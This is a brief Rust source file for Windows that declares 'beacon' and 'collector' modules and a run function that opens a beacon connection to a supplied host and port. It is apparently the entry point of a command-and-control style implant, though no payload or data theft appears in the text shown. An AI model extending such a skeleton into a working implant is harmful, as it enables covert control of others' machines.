mod beacon;
mod collector;

use windows::core::HSTRING;

#[cfg(feature = "logging")]
pub fn init_logging() {
    simple_logger::init().unwrap();
}

pub fn run(hostname: &HSTRING, port: u16) -> windows::core::Result<()> {
    let mut beacon = beacon::Beacon::new()?;
    beacon.init_conn(hostname, port)?;

    Ok(())
}
